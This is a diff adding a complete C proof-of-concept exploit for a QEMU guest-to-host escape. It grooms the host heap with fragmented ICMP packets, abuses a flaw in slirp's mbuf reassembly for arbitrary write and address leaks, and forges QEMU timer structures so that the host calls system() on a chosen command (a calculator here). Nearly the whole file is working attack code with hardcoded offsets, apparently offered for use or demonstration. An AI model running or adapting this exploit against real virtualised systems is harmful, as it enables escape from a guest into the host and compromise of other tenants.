@@ -1,0 +1,656 @@
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <net/ethernet.h>
+#include <arpa/inet.h>
+#include <linux/icmp.h>
+#include <linux/if_packet.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <time.h>
+
+
+#define die(x) do {                             \
+    perror(x);                                  \
+    exit(EXIT_FAILURE);                         \
+  }while(0);
+
+// * * * * * * * * * * * * * * *  Constans * * * * * * * * * * * * * * * * * *
+
+#define SRC_ADDR "10.0.2.15"
+#define DST_ADDR "10.0.2.2"
+
+#define INTERFACE "ens3"
+
+#define ETH_HDRLEN 14         // Ethernet header length
+#define IP4_HDRLEN 20         // IPv4 header length
+#define ICMP_HDRLEN 8         // ICMP header length for echo request, excludes data
+#define MIN_MTU 12000
+
+// * * * * * * * * * * * * * * * QEMU Symbol offset * * * * * * * * * * * * * * * * * *
+
+#define SYSTEM_PLT 0x029b290
+#define QEMU_CLOCK 0x10e8200
+#define QEMU_TIMER_NOTIFY_CB 0x2f4bff
+#define MAIN_LOOP_TLG 0x10e81e0
+#define CPU_UPDATE_STATE 0x488190
+
+// Some place in bss which is not used to craft fake stucts
+#define FAKE_STRUCT 0xf43360
+
+// * * * * * * * * * * * * * * * QEMU Structs * * * * * * * * * * * * * * * * * *
+
+struct mbuf {
+	struct	mbuf *m_next;		/* Linked list of mbufs */
+	struct	mbuf *m_prev;
+	struct	mbuf *m_nextpkt;	/* Next packet in queue/record */
+	struct	mbuf *m_prevpkt;	/* Flags aren't used in the output queue */
+	int	m_flags;		/* Misc flags */
+
+	int	m_size;			/* Size of mbuf, from m_dat or m_ext */
+	struct	socket *m_so;
+
+	char * m_data;			/* Current location of data */
+	int	m_len;			/* Amount of data in this mbuf, from m_data */
+
+	void *slirp;
+	char resolution_requested;
+	u_int64_t expiration_date;
+	char   *m_ext;
+	/* start of dynamic buffer area, must be last element */
+	char  *  m_dat;
+};
+
+
+struct QEMUTimer {
+    int64_t expire_time;        /* in nanoseconds */
+    void *timer_list;
+    void *cb;
+    void *opaque;
+    void *next;
+    int scale;
+};
+
+
+struct QEMUTimerList {
+    void * clock;
+    char active_timers_lock[0x38];
+    struct QEMUTimer *active_timers;
+    struct QEMUTimerList *le_next;   /* next element */                      \
+    struct QEMUTimerList **le_prev;  /* address of previous next element */  \
+    void *notify_cb;
+    void *notify_opaque;
+
+    /* lightweight method to mark the end of timerlist's running */
+    size_t timers_done_ev;
+};
+
+
+
+// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *
+
+int raw_socket;
+int recv_socket;
+int spray_id;
+int idx;
+char mac[6];
+
+void * code_leak;
+void * heap_leak;
+
+void *Malloc(size_t size) {
+  void * ptr = calloc(size,1);
+  if (!ptr) {
+    die("malloc() failed to allocate");
+  }
+  return ptr;
+}
+
+unsigned short in_cksum(unsigned short *ptr,int nbytes) {
+
+register long           sum;            /* assumes long == 32 bits */
+    u_short oddbyte;
+    register u_short answer; /* assumes u_short == 16 bits */
+
+    /*
+     * Our algorithm is simple, using a 32-bit accumulator (sum),
+     * we add sequential 16-bit words to it, and at the end, fold back
+     * all the carry bits from the top 16 bits into the lower 16 bits.
+     */
+
+    sum = 0;
+    while (nbytes > 1) {
+      sum += *ptr++;
+      nbytes -= 2;
+}
+
+/* mop up an odd byte, if necessary */
+if (nbytes == 1) {
+oddbyte = 0;            /* make sure top half is zero */
+*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
+sum += oddbyte;
+}
+
+/*
+ * Add back carry outs from top 16 bits to low 16 bits.
+ */
+
+sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
+sum += (sum >> 16);                     /* add carry */
+answer = ~sum;          /* ones-complement, then truncate to 16 bits */
+return(answer);
+}
+
+void hex_dump(char *desc, void *addr, int len) 
+{
+    int i;
+    unsigned char buff[17];
+    unsigned char *pc = (unsigned char*)addr;
+    if (desc != NULL)
+        printf ("%s:\n", desc);
+    for (i = 0; i < len; i++) {
+        if ((i % 16) == 0) {
+            if (i != 0)
+                printf("  %s\n", buff);
+            printf("  %04x ", i);
+        }
+        printf(" %02x", pc[i]);
+        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
+            buff[i % 16] = '.';
+        } else {
+            buff[i % 16] = pc[i];
+        }
+        buff[(i % 16) + 1] = '\0';
+    }
+    while ((i % 16) != 0) {
+        printf("   ");
+        i++;
+    }
+    printf("  %s\n", buff);
+}
+
+char * ethernet_header(char * eth_hdr){
+  
+    /* src MAC :  52:54:00:12:34:56 */
+    memcpy(&eth_hdr[6],mac,6);
+
+    // Next is ethernet type code (ETH_P_IP for IPv4).
+    // http://www.iana.org/assignments/ethernet-numbers
+    eth_hdr[12] = ETH_P_IP / 256;
+    eth_hdr[13] = ETH_P_IP % 256;
+    return eth_hdr;
+}
+
+void ip_header(struct  iphdr * ip ,u_int32_t src_addr,u_int32_t dst_addr,u_int16_t payload_len,
+                         u_int8_t protocol,u_int16_t id,uint16_t frag_off){
+
+  /* rfc791 */
+  ip->ihl = IP4_HDRLEN / sizeof (uint32_t);
+  ip->version = 4;
+  ip->tos = 0x0;
+  ip->tot_len = htons(IP4_HDRLEN + payload_len);
+  ip->id = htons(id);
+  ip->ttl = 64;
+  ip->frag_off = htons(frag_off);
+  ip->protocol = protocol;
+  ip->saddr = src_addr;
+  ip->daddr = dst_addr;
+  ip->check = in_cksum((unsigned short *)ip,IP4_HDRLEN);
+}
+
+void icmp_header(struct icmphdr *icmp, char *data, size_t size) {
+
+  /* rfc792 */
+  icmp->type = ICMP_ECHO;
+  icmp->code = 0;
+  icmp->un.echo.id = htons(0);
+  icmp->un.echo.sequence = htons(0);
+  if (data) {
+    char * payload = (char * )icmp+ ICMP_HDRLEN;
+    memcpy(payload, data, size);
+  }
+
+  icmp->checksum = in_cksum((unsigned short *)icmp, ICMP_HDRLEN + size);
+
+}
+
+void send_pkt(char *frame, u_int32_t frame_length) {
+
+  struct sockaddr_ll sock;
+  sock.sll_family = AF_PACKET;
+  sock.sll_ifindex = idx;
+  sock.sll_halen = 6;
+  memcpy (sock.sll_addr, mac, 6 * sizeof (uint8_t));
+  
+  if(sendto(raw_socket,frame,frame_length,0x0,(struct sockaddr *)&sock,
+            sizeof(sock))<0)
+    die("sendto()");
+}
+
+void send_ip4(uint32_t id,u_int32_t size,char * data,u_int16_t frag_off) {
+
+  u_int32_t src_addr, dst_addr;
+  src_addr = inet_addr(SRC_ADDR);
+  dst_addr = inet_addr(DST_ADDR);
+
+  char * pkt = Malloc(IP_MAXPACKET);
+  struct iphdr * ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+
+  ethernet_header(pkt);
+  u_int16_t payload_len = size;
+  ip_header(ip,src_addr,dst_addr,payload_len,IPPROTO_ICMP,id,frag_off);
+
+  if(data) {
+    char * payload = (char *)pkt + ETH_HDRLEN + IP4_HDRLEN;
+    memcpy(payload, data, payload_len);
+  }
+  
+  u_int32_t frame_length = ETH_HDRLEN + IP4_HDRLEN + payload_len;
+  send_pkt(pkt,frame_length);
+  free(pkt);
+}
+
+void send_icmp(uint32_t id,u_int32_t size,char * data,u_int16_t frag_off) {
+
+  char * pkt = Malloc(IP_MAXPACKET);
+  struct icmphdr * icmp = (struct icmphdr * )(pkt);
+
+  if(!data)
+      data = Malloc(size);
+  icmp_header(icmp,data,size);
+
+  u_int32_t len =  ICMP_HDRLEN + size;
+  send_ip4(id,len,pkt,frag_off);
+  free(pkt);
+ }
+
+// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *
+
+void initialize() {
+   int sd;
+   struct ifreq ifr;
+   char interface[40];
+   int mtu;
+
+   srand(time(NULL));
+   strcpy (interface, INTERFACE);
+
+  // Submit request for a socket descriptor to look up interface.
+  if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+    die("socket() failed to get socket descriptor for using ioctl()");
+  }
+    // Use ioctl() to get interface maximum transmission unit (MTU).
+  memset (&ifr, 0, sizeof (ifr));
+  strcpy (ifr.ifr_name, interface);
+  if (ioctl (sd, SIOCGIFMTU, &ifr) < 0) {
+    die("ioctl() failed to get MTU ");
+  }
+  mtu = ifr.ifr_mtu;
+  printf ("MTU of interface %s : %i\n", interface, mtu);
+  if (mtu < MIN_MTU) {
+    printf("Run\n$ ip link set dev %s mtu 12000\n",interface);
+    die("");
+  }
+
+  // Use ioctl() to look up interface name and get its MAC address.
+  memset (&ifr, 0, sizeof (ifr));
+  snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
+  if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
+    die("ioctl() failed to get source MAC address ");
+  }
+  memcpy (mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+  printf ("MAC %s :", interface);
+  for (int i=0; i<5; i++) {
+    printf ("%02x:", mac[i]);
+  }
+  printf ("%02x\n", mac[5]);
+
+  // Use ioctl() to look up interface index which we will use to
+  // bind socket descriptor sd to specified interface with setsockopt() since
+  // none of the other arguments of sendto() specify which interface to use.
+  memset (&ifr, 0, sizeof (ifr));
+  snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
+  if (ioctl (sd, SIOCGIFINDEX, &ifr) < 0) {
+    die("ioctl() failed to find interface ");
+  }
+
+  close (sd);
+  printf ("Index for interface %s : %i\n", interface, ifr.ifr_ifindex);
+  idx = ifr.ifr_ifindex;
+  
+  if((raw_socket = socket(PF_PACKET, SOCK_RAW, htons (ETH_P_ALL)))==-1)
+      die("socket() failed to obtain raw socket");
+
+
+  /* Bind socket to interface index. */
+  if (setsockopt (raw_socket, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof (ifr)) < 0) {
+    die("setsockopt() failed to bind to interface ");
+  }
+
+  printf("Initialized socket discriptors\n");
+}
+
+
+void spray(uint32_t size, u_int32_t count) {
+  printf("Spraying 0x%x x ICMP[0x%x]\n",count,size);
+   int s;
+   u_int16_t frag_off;
+   char * data;
+
+   for (int i = 0; i < count; i++) {
+     send_icmp(spray_id + i,size, NULL, IP_MF);
+   }
+}
+
+void arbitrary_write(void *addr, size_t addrlen, char *payload, size_t size,
+                     size_t spray_count) {
+  
+    spray(0x8, spray_count);
+
+
+    size_t id = spray_id + spray_count;
+    // Target
+    size_t target_id = id++;
+    send_ip4(target_id, 0x8, NULL, IP_MF);
+
+   
+    // Padding
+    send_ip4(id++, 0x8, NULL, IP_MF);
+    send_ip4(id++, 0x8, NULL, IP_MF);
+
+    // Piviot Point
+    size_t hole_1 = id++;
+    send_ip4(hole_1, 0x8, NULL, IP_MF);
+
+
+    // Padding
+    send_ip4(id++, 0xC30, NULL, IP_MF);
+
+    // For creating hole
+    size_t hole_2 = id++;
+    send_ip4(hole_2, 0x8, NULL, IP_MF);
+
+    // To  prevent consolidation
+    send_ip4(id++, 0x8, NULL, IP_MF);
+
+    // This should create the fist hole
+    send_ip4(hole_1, 0x8, NULL, 0x1);
+
+    // This should create the second hole
+    send_ip4(hole_2, 0x8, NULL, 0x1);
+
+    int m_data_off = -0x70;
+    int m_len = m_data_off;
+    addr = (void *)((size_t)addr + ((m_len * -1) - addrlen));
+    if (addrlen != 0x8) {
+      m_len -= (0x8 - addrlen);
+    }
+
+    size_t vuln_id = id++;
+
+    char * pkt = Malloc(IP_MAXPACKET);
+    memset(pkt,0x0,IP_MAXPACKET);
+    struct iphdr * ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+    ethernet_header(pkt);
+
+    u_int16_t pkt_len = 0xc90;
+    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,IP_MF);
+    u_int32_t frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
+
+    // The mbuf of this packet will be placed in the second hole and
+    // m_ext buff will be placed on the first hole, We will write wrt
+    // to this.
+    send_pkt(pkt,frame_length);
+
+    memset(pkt,0x0,IP_MAXPACKET);
+    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+    ethernet_header(pkt);
+    pkt_len = 0x8;
+    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,0x192);
+    frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
+
+    // Trigger the bug to change target's m_len
+    send_pkt(pkt,frame_length);
+
+
+    // Underflow and write, to change m_data
+    char addr_buf[0x8] = {0};
+    if (addrlen != 0x8) {
+      memcpy(&addr_buf[(0x8-addrlen)],(char *)&addr,addrlen);
+    } else {
+      memcpy(addr_buf,(char *)&addr,8);
+    }
+    send_ip4(target_id, 0x8, addr_buf, 0x1|IP_MF);
+    send_ip4(target_id, size, payload, 0x2);
+
+    hex_dump("Writing Payload ", payload, size);
+}
+
+
+void recv_leaks(){
+  /* Prepare recv sd */
+  /* Submit request for a raw socket descriptor to receive packets. */
+  int recvsd, fromlen, bytes, status;
+  struct sockaddr from;
+  char recv_ether_frame[IP_MAXPACKET];
+  struct iphdr *recv_iphdr = (struct iphdr *)(recv_ether_frame + ETH_HDRLEN);
+  struct icmphdr *recv_icmphdr =
+      (struct icmphdr *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);
+
+  for (;;) {
+
+    memset(recv_ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
+    memset(&from, 0, sizeof(from));
+    fromlen = sizeof(from);
+    if ((bytes = recvfrom(recv_socket, recv_ether_frame, IP_MAXPACKET, 0,
+                          (struct sockaddr *)&from, (socklen_t *)&fromlen)) <
+        0) {
+      status = errno;
+      // Deal with error conditions first.
+      if (status == EAGAIN) { // EAGAIN = 11
+        printf("Time out\n");
+      } else if (status == EINTR) { // EINTR = 4
+        continue; // Something weird happened, but let's keep listening.
+      } else {
+        perror("recvfrom() failed ");
+        exit(EXIT_FAILURE);
+      }
+    } // End of error handling conditionals.
+
+    // Check for an IP ethernet frame, carrying ICMP echo reply. If not, ignore
+    // and keep listening.
+    if ((((recv_ether_frame[12] << 8) + recv_ether_frame[13]) == ETH_P_IP) &&
+        (recv_iphdr->protocol == IPPROTO_ICMP) &&
+        (recv_icmphdr->type == ICMP_ECHOREPLY) && (recv_icmphdr->code == 0) &&
+        (recv_icmphdr->checksum == 0xffff)) {
+      hex_dump("Recieved ICMP Replay : ", recv_ether_frame, bytes);
+
+      code_leak = (void *)(*((size_t *)&recv_ether_frame[0x40]) - CPU_UPDATE_STATE);
+      size_t *ptr = (size_t *)(recv_ether_frame + 0x30);
+      for (int i = 0; i < (bytes / 0x8); i++) {
+        if ((ptr[i] & 0x7f0000000000) == 0x7f0000000000) {
+          heap_leak = (void *)(ptr[i] & 0xffffff000000);
+          break;
+        }
+      }
+
+      printf("Host Code Leak : %p\n", code_leak);
+      printf("Host Heap Leak : %p\n", heap_leak);
+      break;
+    }
+  }
+}
+
+void leak() {
+    u_int32_t src_addr, dst_addr;
+    src_addr = inet_addr(SRC_ADDR);
+    dst_addr = inet_addr(DST_ADDR);
+
+    /* Crafting Fake ICMP Packet For Leak */
+    char * pkt = Malloc(IP_MAXPACKET);
+    struct iphdr * ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+    struct icmphdr * icmp = (struct icmphdr * )(pkt+ETH_HDRLEN+IP4_HDRLEN);
+    ethernet_header(pkt);
+    ip_header(ip,src_addr,dst_addr,ICMP_HDRLEN,IPPROTO_ICMP,0xbabe,IP_MF);
+
+    ip->tot_len = ntohs(ip->tot_len) - IP4_HDRLEN;
+    ip->id = ntohs(ip->id);
+    ip->frag_off = htons(ip->frag_off);
+
+    icmp_header(icmp,NULL,0x0);
+    char * data = (char *)icmp + ICMP_HDRLEN + 8;
+    size_t pkt_len = ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN;
+
+    spray_id = rand() & 0xffff;
+    arbitrary_write((void * )(0xb00-0x20),3,pkt,pkt_len+4,0x100);
+
+    // This is same as the arbitrary write function
+    spray_id = rand() & 0xffff;
+    spray(0x8, 0x20);
+    size_t id = spray_id + 0x20;
+
+    size_t replay_id = id++;
+    send_ip4(replay_id, 0x100, NULL, IP_MF);
+
+    // Target
+    size_t target_id = id++;
+    send_ip4(target_id, 0x8, NULL, IP_MF);
+
+   
+    // Padding
+    send_ip4(id++, 0x8, NULL, IP_MF);
+    send_ip4(id++, 0x8, NULL, IP_MF);
+
+    // Piviot Point
+    size_t hole_1 = id++;
+    send_ip4(hole_1, 0x8, NULL, IP_MF);
+
+
+    // Padding
+    send_ip4(id++, 0xC30, NULL, IP_MF);
+
+    // For creating hole
+    size_t hole_2 = id++;
+    send_ip4(hole_2, 0x8, NULL, IP_MF);
+
+    // Prevent Consolidation
+    send_ip4(id++, 0x8, NULL, IP_MF);
+
+    // This should create the fist hole
+    send_ip4(hole_1, 0x8, NULL, 0x1);
+
+    // This should create the second hole
+    send_ip4(hole_2, 0x8, NULL, 0x1);
+
+    // Trigger the bug to change target's m_len
+    int m_data_off = -0xd50;
+    int m_len = m_data_off;
+    size_t * addr = (size_t * )(0xb00 - 0x20 + ETH_HDRLEN + 0xe +  6) ;
+    size_t addrlen = 0x3;
+
+    if (addrlen != 0x8) {
+      m_len -= (0x8 - addrlen);
+    }
+
+    size_t vuln_id = id++;
+
+    memset(pkt,0x0,IP_MAXPACKET);
+    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+    ethernet_header(pkt);
+
+    pkt_len = 0xc90;
+    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,IP_MF);
+    u_int32_t frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
+    send_pkt(pkt,frame_length);
+
+    
+    memset(pkt,0x0,IP_MAXPACKET);
+    ip = (struct iphdr * ) (pkt + ETH_HDRLEN);
+    ethernet_header(pkt);
+    pkt_len = 0x8;
+    ip_header(ip,m_len,0x0,pkt_len,IPPROTO_ICMP,vuln_id,0x192);
+    frame_length = ETH_HDRLEN + IP4_HDRLEN + pkt_len;
+    send_pkt(pkt,frame_length);
+
+
+    // Underflow and write to change m_data
+    char addr_buf[0x8] = {0};
+    if (addrlen != 0x8) {
+      memcpy(&addr_buf[(0x8-addrlen)],(char *)&addr,addrlen);
+    } else {
+      memcpy(addr_buf,(char *)&addr,8);
+    }
+    send_ip4(target_id, 0x8, addr_buf, 0x1);
+
+  if ((recv_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
+      die("socket() failed to obtain a receive socket descriptor");
+    send_ip4(replay_id, 0x8, NULL, 0x20);
+    recv_leaks();
+
+
+    char zero[0x28] = {0};
+    spray_id = rand() & 0xffff;
+    printf("Cleaning Heap\n");
+    arbitrary_write(heap_leak + (0xb00 - 0x20),3,zero,sizeof(zero),0x20);
+}
+
+
+void pwn() {
+  char payload[0x200] = {0};
+  struct QEMUTimerList *tl = (struct QEMUTimerList *)payload;
+  struct QEMUTimer *ts =
+      (struct QEMUTimer *)(payload + sizeof(struct QEMUTimerList));
+
+  char cmd[] = "/usr/bin/gnome-calculator";
+  memcpy((void *)(payload + sizeof(struct QEMUTimerList )   \
+                             +sizeof(struct QEMUTimer )),  \
+                  (void *)cmd,sizeof(cmd));
+
+  void * fake_timer_list = code_leak +  FAKE_STRUCT;
+  void * fake_timer = fake_timer_list +  sizeof(struct QEMUTimerList);
+
+  void *system = code_leak + SYSTEM_PLT;
+  void *cmd_addr = fake_timer + sizeof(struct QEMUTimer);
+  /* Fake Timer List */
+  tl->clock = (void *)(code_leak + QEMU_CLOCK);
+  *(size_t *)&tl->active_timers_lock[0x30] = 0x0000000100000000;
+  tl->active_timers = fake_timer;
+  tl->le_next = 0x0;
+  tl->le_prev = 0x0;
+  tl->notify_cb = code_leak + QEMU_TIMER_NOTIFY_CB;
+  tl->notify_opaque = 0x0;
+  tl->timers_done_ev = 0x0000000100000000;
+
+  /*Fake Timer structure*/
+  ts->timer_list = fake_timer_list;
+  ts->cb = system;
+  ts->opaque = cmd_addr;
+  ts->scale = 1000000;
+  ts->expire_time = -1;
+
+  spray_id = rand() & 0xffff;
+  size_t payload_size =
+      sizeof(struct QEMUTimerList) + sizeof(struct QEMUTimerList) + sizeof(cmd);
+
+  printf("Writing fake structure : %p\n",fake_timer_list);
+  arbitrary_write(fake_timer_list,8,payload,payload_size,0x20);
+
+  spray_id = rand() & 0xffff;
+  void *  main_loop_tlg = code_leak + MAIN_LOOP_TLG;
+  printf("Overwriting main_loop_tlg %p\n",main_loop_tlg);
+  arbitrary_write(main_loop_tlg,8,(char *)&fake_timer_list,8,0x20);
+}
+
+int main() {
+    initialize();
+    leak();
+    pwn();
+    return 0;
+}
